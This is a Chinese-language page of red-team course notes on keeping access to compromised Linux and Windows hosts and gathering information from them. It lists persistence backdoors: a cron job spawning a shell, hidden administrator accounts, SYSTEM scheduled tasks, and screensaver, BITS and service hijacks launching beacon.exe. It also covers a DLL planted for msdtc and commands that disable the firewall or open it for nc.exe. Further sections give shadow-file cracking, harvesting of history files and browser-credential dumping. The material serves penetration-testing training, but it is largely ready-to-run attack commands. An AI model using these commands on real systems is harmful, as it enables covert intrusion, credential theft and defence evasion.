<hr>
<p><strong>Linux权限维持—Cron后门</strong></p>
<p>在Linux系统中，计划任务一般是由cron承担，我们可以把cron设置为开机时自动启动。cron启动后，它会读取它的所有配置文件（全局性配置文件/etc/crontab，以及每个用户的计划任务配置文件），然后cron会根据命令和执行时间来按时来调用工作任务。<br>•cron表达式在线生成：<a target="_blank" rel="noopener" href="http://qqe2.com/cron">http://qqe2.com/cron</a><br>•(crontab -l;echo ‘*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash –noprofile -i’)|crontab –</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709133903692.png" alt="image-20220709133903692"></p>
<hr>
<p><strong>Windows权限维持—隐藏账号</strong></p>
<p>这个是比较常见的创建后门的方法，直接建立一个隐藏账号<br>•net user test$ 123456 /add<br>•net localgroup administrators test$ /add<br>•利用注册表创建隐藏用户的小工具。工具地址：<a target="_blank" rel="noopener" href="https://github.com/wgpsec/CreateHiddenAccount">https://github.com/wgpsec/CreateHiddenAccount</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709134023492.png" alt="image-20220709134023492"></p>
<hr>
<p><strong>Windows权限维持—计划任务</strong></p>
<p>Windows实现定时任务主要有schtasks与at二种方式:<br>At 适用于windows xp/2003，Schtasks适用于win7/2008或者以后<br>例如每小时执行一次 calc.exe<br>•schtasks /create /tn updater /tr calc.exe /sc hourly /mo 1</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709134116890.png" alt="image-20220709134116890"></p>
<p>schtasks是windows下计划任务的命令，可以设置在指定时间执行指定程序或脚本。<br>权限要求：提权不提权都可。<br>优点：不同于自启注册键和服务项，计划任务的设定方式更多样、灵活，位置也相对较为隐蔽（手工排查要多点几下）。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709134143770.png" alt="image-20220709134143770"></p>
<p>在目标主机上创建一个名为test的计划任务，启动程序为C:\123.exe，启动权限为system，启动时间为每隔一小时启动一次。当执行完该命令，该计划任务就已经启动了<br>•schtasks /create /tn test /sc HOURLY /mo 1 /tr c:\123.exe /ru system /f<br>普通用户<br>•schtasks /create /tn test /sc HOURLY /mo 1 /tr c:\123.exe /ru %USERNAME% /f<br>查询该test计划任务<br>•schtasks /query | findstr test<br>启动该test计划任务<br>•schtasks /run /i /tn “test”<br>删除该test计划任务<br>•schtasks /delete /tn “test” /f</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709134211758.png" alt="image-20220709134211758"></p>
<p>msf权限维持模块-persistence</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709134235069.png" alt="image-20220709134235069"></p>
<hr>
<p><strong>Windows权限维持—注册键</strong></p>
<p>注册表作为Windows的核心数据库，存储着系统和用户的很多关键信息。Windows在注册表中提供了两套独立的路径，<br>•一个是当前用户的“HKEY_CURRENT_USER”即“HKCU”，<br>•另一个就是针对当前用户物理状态的“HKEY_LOCAL_MACHINE”即“HKLM”，仅有特权账户可以对其进行修改。<br>权限要求：提权不提权都可</p>
<hr>
<p><strong>Windows权限维持— Winlogon</strong></p>
<p>winlogon.exe是windows中非常重要的进程,在用户还没登录系统之前就已经存在,并与密码验证相关的重要任务精密相关。例如，当在用户登录时，Winlogon 进程负责将用户配置文件加载到注册表中:<br>•HKLM\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon<br>•HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</p>
<hr>
<p><strong>Windows权限维持—屏幕保护程序</strong></p>
<p>利用前提:对方开启了屏幕保护<br>屏幕保护程序，当初的设计是为了防止长期屏幕的显示，预防老化与缩短屏幕显示器老化的一种保护程序。<br>在对方开启屏幕保护的情况下，我们可以修改屏保程序为我们的恶意程序从而达到后门持久化的目的，攻击者可以利用屏幕保护程序来隐藏shell,达到一定的权限维持。<br>权限要求：普通用户<br>注册表位置:<br>•HKEY_CURRENT_USER\Control Panel\Desktop</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709134439234.png" alt="image-20220709134439234"></p>
<p>直接写入注册表即可：<br>•reg add “hkcu\control panel\desktop” /v SCRNSAVE.EXE /d<br>C:\Users\hunter\Desktop\beacon.exe /f<br>•reg add “hkcu\control panel\desktop” /v ScreenSaveActive /d 1 /f<br>•reg add “hkcu\control panel\desktop” /v ScreenSaverIsSecure /d 0 /f<br>•reg add “hkcu\control panel\desktop” /v ScreenSaveTimeOut /d 60 /f</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709134510639.png" alt="image-20220709134510639"></p>
<hr>
<p><strong>Windows权限维持—启动项后门</strong></p>
<p>开始菜单启动项，指示启动文件夹的位置，具体的位置是“开始”菜单中的“所有程序”-“启动”选项：<br>•C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709134559193.png" alt="image-20220709134559193"></p>
<hr>
<p><strong>Windows权限维持—自启动服务后门</strong></p>
<p>在 Windows上还有一个重要的机制，也就是服务。服务程序通常默默的运行在后台，且拥有 SYSTEM 权限，非常适合用于后门持久化。我们可以将 EXE /DLL等可执行文件注册为服务实现后门持久化。可以通过如下命令行方式添加一个服务<br>•sc create “SD” binpath= “C:\Users\SD\Desktop\test.exe”<br>•sc description “SD” “description” 设置服务的描述字符串<br>•sc config “SD” start= auto 设置这个服务为自动启动<br>•net start “SD” 启动服务<br>•sc delete “SD”</p>
<hr>
<p><strong>Windows权限维持—WMI构造无文件后门</strong></p>
<p>WMI是一项Windows管理技术，其全称是Windows Management Instrumentation，即Windows管理规范。大多数基于Windows的软件依赖于此服务。无文件无进程使得他非常隐蔽成为后门，但由于他的隐蔽性现在被大多数杀软所查杀。<br>通过与Powershell命令配合使用可以实现无文件，具有良好的隐蔽性也是目前较为常用的持久化手段。<br>权限要求：未降权的管理员权限。</p>
<p>由于WMI的事件会循环执行，为确保不会无限弹shell，可以使用系统启动时间来限制（只要触发延时可以落在限定区间即可，有些机器启动慢因此起始时间调高些）。示例命令如下：</p>
<hr>
<p><strong>Windows权限维持—后台智能传输服务（BITS）</strong></p>
<p>后台智能传送服务 (BITS) 可帮助传输大量数据而不会降低网络性能。它通过在小区块中传输数据、充分利用可用的但未使用的带宽和在目的地重组数据的方式来实现此操作。在 Microsoft® Windows Server 2003 家族操作系统上和 Microsoft® Windows 2000 上都支持 BITS。<br>权限要求：管理员权限（不必过UAC）。<br>•bitsadmin /list /allusers /verbose</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709134752860.png" alt="image-20220709134752860"></p>
<p>添加任务：<br>•bitsadmin /create evil<br>•bitsadmin /addfile evil “C:\Users\hunter\Desktop\beacon.exe”<br>“C:\Users\hunter\Desktop\beacon.exe”<br>•bitsadmin.exe /SetNotifyCmdLine evil<br>“C:\Users\hunter\Desktop\beacon.exe” NUL<br>•bitsadmin /Resume evil</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709134832358.png" alt="image-20220709134832358"></p>
<hr>
<p><strong>Windows权限维持—MSDTC</strong></p>
<p>msdtc.exe是微软分布式传输协调bai程序。该du进程调用系统Microsoft Personal Web Server和Microsoft SQL Server。该服务用于管理多个服务器。该服务启动后会尝试从System32加载三个DLL文件：oci.dll、SQLLib80.dll、xa80.dll。服务项如下<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709134912500.png" alt="image-20220709134912500"></p>
<p>在默认的Windows安装中，System32文件夹中缺少oci.dll这个文件，在获得写权限的情况下可以在该文件夹下写入一个同名的dll，服务启动时执行恶意代码。<br>默认情况下，由于启动类型设置为“手动”，通过以下命令设置自启：<br>•sc qc msdtc<br>•sc config msdtc start= auto<br>恶意dll会被加载到msdtc.exe进程中执行</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709134948776.png" alt="image-20220709134948776"></p>
<hr>
<p><strong>Windows权限维持—CS插件化</strong></p>
<p>•<a target="_blank" rel="noopener" href="https://github.com/0xthirteen/SharpStay">https://github.com/0xthirteen/SharpStay</a><br>•<a target="_blank" rel="noopener" href="https://github.com/lintstar/LSTAR">https://github.com/lintstar/LSTAR</a></p>
<h2 id="内-网-本-机-收-集"><a href="#内-网-本-机-收-集" class="headerlink" title="内 网 本 机 收 集"></a>内 网 本 机 收 集</h2><p><strong>内网信息收集概述</strong></p>
<p>当我们进入内网后，面对的是一片“黑暗森林”，所以要首先会对当前所处的网络环境进行判断，通常的判断分为三种。<br>•我是谁？——对机器角色的判断。<br>•这是哪？——对目前机器所处网络环境的拓扑结构进行分析和判断。<br>•我在哪？——对目前机器所处位置区域的判断。</p>
<p>•在内网渗透测试环境中，有着很多设备和报警及防护软件<br>•通过对目标内网信息的收集，洞察内网网络拓扑和结构，找出内网最薄弱的环节。<br>•信息收集的深度，直接关系到整个内网渗透测试的成败。</p>
<p>•对机器角色的判断，判断已经控制的机器是普通 Web 服务器、开发测试服务器、公共服务器、文件服务器、代理服务器、DNS 服务器还是存储服务器等。具体的判断是通过对机器内的主机名、文件、网络连接等多种情况综合进行的。<br>•对目前机器所处网络环境的拓扑结构进行分析和判断：需要对所处内网进行全面的数据收集及分析整理，绘制出大概的内网整体拓扑结构图，以便后期进行进一步的内网渗透和准确定位内网具体目标，从而完成渗透测试。<br>•对目前机器所处位置区域的判断：判断机器处于网络拓扑中的哪个区域，是在 DMZ 区、办公网，还是核心区、核心 DB 等位置。当然，这里的区域并不是绝对的，只是一个大概的环境，不同位置的网络环境不一样，区域的界限也不一定明显。</p>
<hr>
<p><strong>Linux本机信息收集–前期信息收集</strong></p>
<p>这里模拟攻击方成功拿下一台机器的低权限准备提权的情况。在运维人员能保证系统和软件维持在新版本、无弱口令、无特殊SUID文件、sudo命令的情况下，Linux提权是基本不可能的，但是安全很难做到万无一失。在各种环境中存在各种不同版本的Linux系统，甚至类UNIX系统，比如:OpenSUSE、Fedora、Oracle Linxu、Slackware、FreeBSD、OpenBSD等等<br>，所以先摸清系统版本信息是关键。</p>
<p>•hostname     # 查看服务器主机名命令<br>•uname –a<br>•uname -mrs<br>•rpm -q kernel<br>•dmesg | grep Linux<br>•ls /boot | grep vmlinuz-<br>明白了系统的版本或发行版，下一步就针对这个搜索有关的提权漏洞，<br>•<a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709135239692.png" alt="image-20220709135239692"></p>
<p>若是不存在提权漏洞的版本，那么注意点就要放到用户的信息上了。<br>•id     # 显示真实有效的用户 ID(UID)和组 ID(GID)<br>•whoami      #当前用户</p>
<p>•groups     # 当前组<br>•who     # 显示目前登录系统的用户信息</p>
<p>比如SUID文件和sudo权限，找带 suid 的文件<br>•find / -perm -u=s 2&gt;/dev/null</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709135359471.png" alt="image-20220709135359471"></p>
<p>查看当前用户执行哪些 sudo 命令无需密码<br>•sudo -l</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709135423739.png" alt="image-20220709135423739"></p>
<p>找到了可以sudo执行的文件又怎么提权呢？<br>•推荐网站:<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> #其中记录了大量的提权方案。<br>在freebsd系统中也有类似sudo的机制，称作doas<br>•cat /etc/doas.conf</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709135454258.png" alt="image-20220709135454258"></p>
<p>/etc/passwd一般不会禁止非root用户读取，可以直接查看<br>•cat /etc/passwd<br>可见存在3个test开头的用户和ldap、oracle、docker等用户，这里相当于给了很多提示，说明了一些可能存在的服务，当然这3个test开头的用户也可以尝试爆破。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709135536702.png" alt="image-20220709135536702"></p>
<p>开机启动项作为比较关键的点，无论是红方还是蓝方都不会放过。<br>•ls /etc/init.d          #查看开机启动配置文件命令</p>
<p>•cat /etc/rc.local        #查看 rc 启动文件</p>
<p>•crontab -l<br>•ls -alh /var/spool/cron<br>•ls -al /etc/ | grep cron</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709135618452.png" alt="image-20220709135618452"></p>
<hr>
<p><strong>Linux本机信息收集—后期信息收集</strong></p>
<p>到了后期阶段，当攻击者成功提权，信息收集的目的其实偏向于扩大战果，而不是寻找突破口，红方人员会详尽一且办法，挖掘机器上有用的信息，然后作为跳板横向进攻。知晓机器上运行着什么进程可以推测机器的定位:<br>•ps -aux # 列出所有进程以及相关信息命令<br>•ps -ef<br>•top     # 总览系统全面信息命令，Ctrl + C 退出界面<br>安装了哪些程序？什么版本？是否正在运行？<br>•ls -alh /usr/bin/<br>•dpkg -l</p>
<p>查看一些常见的服务配置文件<br>•cat /etc/syslog.conf<br>•cat /etc/chttp.conf<br>•cat /etc/lighttpd.conf<br>•cat /etc/cups/cupsd.conf<br>•cat /etc/inetd.conf<br>•cat /etc/apache2/apache2.conf<br>•cat /etc/my.conf<br>•cat /etc/httpd/conf/httpd.conf<br>•ls -aRl /etc/ | awk ‘$1 ~ /^.*r.*/</p>
<p>作为最高权限用户，shadow文件不可不看，万一跑出几个密码，横向渗透的成功率就会大大提高，将passwd和shaodw文件下载到kali中进行unshadow，随后john跑hash<br>•mkdir /root/.john<br>•cd /root/.john<br>•unshadow passwd.txt shadow.txt &gt; hash.txt</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709135752420.png" alt="image-20220709135752420"></p>
<p>除了shadow以外也可以看一看其他敏感文件，比如数据库的配置、历史记录等<br>•cat /var/apache2/config.inc<br>•cat /var/lib/mysql/mysql/user.MYD<br>•cat /root/anaconda-ks.cfg<br>•cat ~/.bash_history<br>•cat ~/.nano_history<br>•cat ~/.atftp_history<br>•cat ~/.mysql_history<br>•cat ~/.php_history</p>
<p>除了本机器上的信息，还要为拿下内网的其他机器做准备，摸清网络拓扑是必须的<br>•route<br>•ip route     # 显示核心路由表<br>•ip neigh     # 显示邻居表<br>•cat /etc/resolv.conf # 查看DNS<br>•arp –e<br>邮件也是一个关键点，某些场景下，可以发现非常敏感的信息。<br>•ls -alh /var/mail/<br>除此之外，具体还要查看哪些信息，就需要根据机器具体情况而定了。</p>
<hr>
<p><strong>Linux本机信息收集—Linux自动化信息收集</strong></p>
<p>linux_information是一款针对linux下信息收集的工具<br>主要模块：<br>•系统信息，能了解主机的地址、版本等信息<br>•用户信息，能了解主机的用户、分组、登陆等情况<br>•服务信息，能了解主机的端口、进程、服务、软件等信息<br>•安全扫描，能了解主机的敏感文件、能利用的漏洞等信息<br>•主机存活信息，能了解当前内网存活主机信息</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709135924617.png" alt="image-20220709135924617"></p>
<hr>
<p><strong>Windows本机信息收集常见思路</strong></p>
<p>通常我们在攻防演练过程中，遇到的Windows的环境是最多的，然⽽在拿到⼀台windows系统权限之后，我们要进⾏横向或者纵向渗透，这是针对windows的信息收集就显得尤为重要。当成功控制一台机器后，其内网结构如何、这台机器是什么角色的、使用机器的人是什么角色的、机器上安装的是什么杀毒软件、机器是通过什么方式上网的、机器是笔记本还是台式机等，都需要通过信息收集来获取。</p>
<p>•windows的本机信息包括主机的系统、权限、内网分配 IP 地址段、安装的软件杀毒、端口、服务、补丁更新频率、网络连接信息、共享、会话等。<br>•如果是域内主机，系统、软件、补丁、服务、杀毒一般都是批量安装的。通过收集本机的相关信息，可以进一步了解整个域的操作系统版本、软件、补丁、用户命名方式等。</p>
<p>•系统管理员密码<br>•其他⽤户 session ， 3389 和 ipc 连接记录 各⽤户回收站信息收集<br>•浏览器密码和浏览器cookies的获取 e chrome firefox 等<br>•windows ⽆线密码获取。数据库密码获取<br>•host ⽂件获取和 dns 缓存信息收集 等等<br>•杀软 补丁 进程 ⽹络代理信息 wpad 信息。软件列表信息<br>•计划任务 账号密码策略与锁定策略 共享⽂件夹 web服务器配置⽂件<br>•vpn 历史密码等 teamview 密码等 启动项 iislog 等等<br>•常⽤的后渗透信息收集⼯具。 powershell+msf 的使⽤</p>
<hr>
<p><strong>Windows本机信息收集–收集本机信息</strong></p>
<p>查询网络配置信息<br>执行如下命令，可以获取当前机器是否处在内网中、有几个内网、内网段分别是多少、是否是域内网、网关 IP 地址、DNS 指向的 IP 地址等信息:<br>•ipconfig /all </p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140059084.png" alt="image-20220709140059084"></p>
<p>查询操作系统及安装软件的版本信息<br>获取操作系统和版本信息：<br>•systeminfo | findstr /B /C:”OS Name” /C:”OS Version”<br>执行以上命令，可以看到当前系统为 Windows Server 2008 R2 Enterprise。如果是中文操作系统，则输入如下命令，<br>•systeminfo | findstr /B /C:”OS 名称” /C:”OS 版本”<br>(查看系统体系结构：执行如下命令，查看系统体系结构，<br>•echo %PROCESSOR_ARCHITECTURE%</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140130061.png" alt="image-20220709140130061"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140138756.png" alt="image-20220709140138756"></p>
<p>查看安装的软件及版本、路径等<br>利用 wmic 命令，可以将结果输出到文本中，具体如下，<br>•wmic product get name,version<br>利用 PowerShell 命令，收集软件版本信息，具体如下，<br>•powershell “Get-WmiObject -class Win32_Product |Select-Object -Property name,version”</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140234588.png" alt="image-20220709140234588"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140255602.png" alt="image-20220709140255602"></p>
<p>查询进程列表<br>执行如下命令，可以查看当前进程列表和进程用户，分析软件、邮件客户端、VPN 和杀毒软件等进程，<br>•tasklist /v<br>执行如下命令，查看进程信息，<br>•wmic process list brief<br>一般来说，域内的软件和杀毒软件应该是一致的。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140321071.png" alt="image-20220709140321071"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140333338.png" alt="image-20220709140333338"></p>
<p>常见的杀毒软件进程：<br>反病毒识别的相关项目:<br>•<a target="_blank" rel="noopener" href="https://github.com/gh0stkey/avList">https://github.com/gh0stkey/avList</a><br>•<a target="_blank" rel="noopener" href="https://github.com/r00tSe7en/get_AV">https://github.com/r00tSe7en/get_AV</a><br>•<a target="_blank" rel="noopener" href="https://github.com/uknowsec/SharpAVKB">https://github.com/uknowsec/SharpAVKB</a><br>•<a target="_blank" rel="noopener" href="https://github.com/3had0w/Antivirus-detection">https://github.com/3had0w/Antivirus-detection</a><br>•<a target="_blank" rel="noopener" href="https://github.com/ars3n11/Aggressor-Scripts">https://github.com/ars3n11/Aggressor-Scripts</a><br><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140407835.png" alt="image-20220709140407835"></p>
<p>查看启动程序信息<br>执行如下命令，查看启动程序信息:<br>•wmic startup get command,caption</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140429763.png" alt="image-20220709140429763"></p>
<p>查看计划任务<br>执行如下命令，查看计划任务:<br>•schtasks /query /fo LIST /v</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140505103.png" alt="image-20220709140505103"></p>
<p>查看主机开机时间<br>执行如下命令，查看主机开机时间：<br>•net statistics workstation</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140535744.png" alt="image-20220709140535744"></p>
<p>查询用户列表<br>执行如下命令，查看本机用户列表。<br>•net user<br>通过分析本机用户列表，可以找出内部网络机器名的命名规则。特别是个人机器，可以推测出整个域的用户命名方式，<br>执行如下命令，获取本地管理员（通常含有域用户）信息。<br>•net localgroup administrators<br>可以看到，本地管理员有两个用户和一个组，如图 所示。默认 Domain Admins 组为域内机器的本地管理员用户。在真实环境中，为了方便管理，会有域用户被添加为域机器的本地管理员用户。<br>执行如下命令，查看当前在线用户，<br>•query user || qwinsta</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140608049.png" alt="image-20220709140608049"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140617111.png" alt="image-20220709140617111"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140630051.png" alt="image-20220709140630051"></p>
<p>列出或断开本地计算机和连接的客户端的会话<br>执行如下命令，列出或断开本地计算机和连接的客户端的会话:<br>•net session</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140700788.png" alt="image-20220709140700788"></p>
<p>查询端口列表<br>执行如下命令，查看端口列表、本机开放的端口所对应的服务和应用程序。<br>•netstat –ano<br>可以看到，当前机器和哪些主机进行了连接，以及 TCP、UDP 等端口使用、监听情况。还可以通过网络连接来进行初步的判断，如代理服务器可能会有很多机器来连代理端口、更新服务器（例如 WSUS）可能开放了更新端口8530、DNS 服务器会开放 53 端口等，再根据其他信息进行综合判断。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140735861.png" alt="image-20220709140735861"></p>
<p>查询补丁列表<br>执行如下命令，查看系统的详细信息。<br>•Systeminfo<br>注意系统的版本、位数、域、补丁信息及跟新频率等。一般域内主机的补丁都是批量安装的，通过查看本地计算机补丁列表，可以找到未打补丁的漏洞。当前更新了162 个补丁:</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140759220.png" alt="image-20220709140759220"></p>
<p>使用 wmic 识别安装在系统中的补丁情况，命令如下：<br>•wmic qfe get Caption,Description,HotFixID,InstalledOn<br>可以看到更新补丁名称、描述、补丁 ID、安装时间等信息:</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140819921.png" alt="image-20220709140819921"></p>
<p>查询本机共享<br>执行如下命令，查看本机共享列表和可访问的域共享列表（域内共享有很多时候是相同的），<br>•net share<br>利用 wmic 查找共享，命令如下：<br>•wmic share get name,path,status</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140851873.png" alt="image-20220709140851873"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140902081.png" alt="image-20220709140902081"></p>
<p>查询路由表及所有可用接口的 ARP 缓存表<br>执行如下命令，查询路由表及所有可用接口的 ARP（地址解析协议）缓存表:<br>•route print<br>•Arp –A</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709140923822.png" alt="image-20220709140923822"></p>
<p>查询防火墙相关配置<br>（1）关闭防火墙<br>Windows Server 2003 系统及之前版本，命令如下。<br>•netsh firewall set opmode disable<br>Windows Server 2003 之后系统版本，命令如下。<br>•netsh advfirewall set allprofiles state off<br>（2）查看防火墙配置<br>•netsh firewall show config</p>
<p>修改防火墙配置<br>Windows Server 2003 系统及之前版本，允许指定程序全部连接，命令如下。<br>•netsh firewall add allowedprogram c:\nc.exe “allow nc” enable<br>Windows Server 2003 之后系统版本，情况如下。<br>允许指定程序连入，命令如下:<br>•netsh advfirewall firewall add rule name=”pass nc” dir=in action=allow<br>program=”C: \nc.exe”<br>允许指定程序连出，命令如下：<br>•netsh advfirewall firewall add rule name=”Allow nc” dir=out action=allow<br>program=”C: \nc.exe”<br>允许 3389 端口放行，命令如下：<br>•netsh advfirewall firewall add rule name=”Remote Desktop” protocol=TCP dir=in<br>localport=3389 action=allow</p>
<p>查看计算机代理配置情况<br>执行如下命令，可以看到代理配置存在服务器为 127.0.0.1:1080 的配置信息，如图所示。<br>•reg query “HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings”</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709141053571.png" alt="image-20220709141053571"></p>
<p>查询并开启远程连接服务<br>查看远程连接端口，在 cmd 下使用注册表查询语句，命令如下，得到连接端口为 0xd3d，转换后为3389:<br>•REG QUERY “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” /V PortNumber</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709141118963.png" alt="image-20220709141118963"></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">在 Windows <span class="keyword">Server</span> <span class="number">2003</span> 中开启 <span class="number">3389</span> 端口</span><br><span class="line">•wmic <span class="type">path</span> win32_terminalservicesetting <span class="keyword">where</span> (__CLASS !=&quot;&quot;) <span class="keyword">call</span> </span><br><span class="line">setallowtsconnections <span class="number">1</span></span><br><span class="line">在 Windows <span class="keyword">Server</span> <span class="number">2008</span> 和 Windows <span class="keyword">Server</span> <span class="number">2012</span> 中开启 <span class="number">3389</span> 端口</span><br><span class="line">•wmic /namespace:\\root\cimv2\terminalservices <span class="type">path</span> </span><br><span class="line">win32_terminalservicesetting <span class="keyword">where</span> (__CLASS !=&quot;&quot;) <span class="keyword">call</span> setallowtsconnections <span class="number">1</span></span><br><span class="line">•wmic /namespace:\\root\cimv2\terminalservices <span class="type">path</span> win32_tsgeneralsetting </span><br><span class="line"><span class="keyword">where</span> (TerminalName=<span class="string">&#x27;RDP-Tcp&#x27;</span>) <span class="keyword">call</span> setuserauthenticationrequired <span class="number">1</span></span><br><span class="line">•reg <span class="keyword">add</span> &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v </span><br><span class="line">fSingleSessionPerUser /t REG_DWORD /d <span class="number">0</span> /f</span><br></pre></td></tr></table></figure>

<p>查看当前权限<br>查看当前权限，命令如下。<br>•whoami<br>获取了一台主机的权限后，会有以下三种情况。<br>•本地普通用户<br>•本地管理员用户<br>•域内用户</p>
<p>在这三种情况中，如果当前内网存在域，本地普通用户只能查询本机相关信息，不能查询域内信息。本地管理员用户和域内用户则可以查询域内信息。其原理是：域内的所有查询都是通过域 LDAP 协议去域控制器进行查询的，而这个查询需要经过权限认证，所以，只有域用户才拥有这个权限；当域用户运行查询命令时，会自动使用 Kerberos 协议进行认证，无须额外输入账号和密码。本地管理员 administrator 权限可以直接提升为 nt authority\system 权限，因此，在域中，除了普通用户，所有机器都有一个机器用户，用户名是机器名后加“$”。在本质上，机器上的system用户对应的就是域里面的机器用户，所以，system 权限是可以运行域内查询的相关命令的。</p>
<p>获取域 SID<br>执行如下命令，获取域 SID。<br>•whoami /all<br>可看到，当前域 pentest 的 SID 为 S-1-5-21-3112629480-1751665795-4053538595，域用户 user1的 SID 为 S-1-5-21-3112629480-1751665795-4053538595-1104，</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709141626748.png" alt="image-20220709141626748"></p>
<p>查询指定账户的详细信息<br>执行如下命令，查询指定账户的详细信息。<br>•net user XXX /domain<br>在 cmd 下输入命令“net user user /domain”，可以看到，当前用户在本地组没有本地管理员权限，在域中属于 Domain Users 组:</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709141649167.png" alt="image-20220709141649167"></p>
<p>电脑上的敏感文件</p>
<p>DPAPI<br>从Windows 2000开始，Microsoft随操作系统一起提供了一种特殊的数据保护接口，称为Data Protection Application Programming Interface（DPAPI）。其分别提供了加密函数CryptProtectData 与解密函数 CryptUnprotectData 以用作敏感信息的加密解密。Dpapi采用的加密类型为对称加密，所以只要找到了密钥，就能解开物理存储的加密信息。<br>其作用范围包括且不限于：<br>•outlook客户端密码<br>•windowscredential凭据<br>•chrome保存的密码凭据<br>•internetexplorer密码凭据</p>
<p>浏览器密码获取<br>•<a target="_blank" rel="noopener" href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a><br>•<a target="_blank" rel="noopener" href="https://github.com/djhohnstein/SharpWeb">https://github.com/djhohnstein/SharpWeb</a><br>•<a target="_blank" rel="noopener" href="https://github.com/QAX-A-Team/BrowserGhost/">https://github.com/QAX-A-Team/BrowserGhost/</a><br>•<a target="_blank" rel="noopener" href="https://github.com/DeEpinGh0st/Browser-cookie-steal">https://github.com/DeEpinGh0st/Browser-cookie-steal</a><br>•<a target="_blank" rel="noopener" href="https://github.com/hayasec/360SafeBrowsergetpass">https://github.com/hayasec/360SafeBrowsergetpass</a></p>
<p>hack-browser-data<br>hack-browser-data 是⼀个解密浏览器数据（密码|历史记录| Cookie |书签 | 信⽤卡 | 下载记录）的导出⼯<br>具，⽀持全平台主流浏览器。<br>•项⽬地址：<a target="_blank" rel="noopener" href="https://github.com/moonD4rk/HackBrowserData/">https://github.com/moonD4rk/HackBrowserData/</a><br>•.\hack-browser-data.exe -b all -f json –dir results –cc</p>
<p>第三方软件</p>
<hr>
<p><strong>Windows本机信息收集—自动化信息收集</strong></p>
